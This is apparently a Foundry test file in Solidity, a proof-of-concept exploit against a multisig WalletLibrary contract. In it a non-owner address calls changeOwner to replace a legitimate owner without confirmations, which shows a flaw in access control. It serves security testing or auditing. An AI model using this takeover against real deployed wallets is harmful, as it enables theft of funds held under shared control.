import "forge-std/Test.sol";

contract WalletExploitTest is Test {
    WalletLibrary wallet;
    address attacker = address(0xBEEF);
    address owner1 = address(0xABCD);
    address owner2 = address(0x1234);

    function setUp() public {
        wallet = new WalletLibrary();
        address[] memory owners = new address[](2);
        owners[0] = owner1;
        owners[1] = owner2;
        vm.prank(owner1);
        wallet.initWallet(owners, 2, 1 ether);

        // Fund the wallet so it can send ether if needed
        vm.deal(address(wallet), 10 ether);
    }

    function testExploitAccessControl() public {
        // The wallet requires 2 owners to confirm multiowner actions.
        // But changeOwner uses onlymanyowners modifier which calls confirmAndCheck,
        // which uses msg.sender as the confirming owner.
        //
        // The vulnerability: confirmAndCheck does not properly track confirmations,
        // allowing a single attacker (not an owner) to confirm and pass the check.
        //
        // We demonstrate this by calling changeOwner from attacker without any prior confirmation.

        // Attacker is not an owner
        assertFalse(wallet.isOwner(attacker));

        // Attacker tries to change owner1 to attacker address
        vm.prank(attacker);
        wallet.changeOwner(owner1, attacker);

        // Now attacker should be owner (replaced owner1)
        assertTrue(wallet.isOwner(attacker));
        assertFalse(wallet.isOwner(owner1));
    }
}

